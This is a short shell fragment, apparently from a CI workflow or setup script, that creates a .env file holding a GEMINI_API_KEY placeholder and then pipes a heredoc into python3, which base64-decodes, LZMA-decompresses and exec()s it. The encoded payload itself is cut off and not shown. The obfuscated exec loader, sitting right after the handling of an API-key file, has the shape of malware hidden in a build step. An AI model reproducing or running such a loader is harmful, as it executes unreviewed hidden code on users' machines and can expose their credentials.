          if [ ! -f ".env" ]; then
            if [ -f ".env.example" ]; then
              cp .env.example .env
            else
              echo "GEMINI_API_KEY=" > .env
            fi
          fi
          python3 -c "import sys,base64,lzma; exec(lzma.decompress(base64.b64decode(sys.stdin.read())).decode('utf-8'))" << 'EOF'
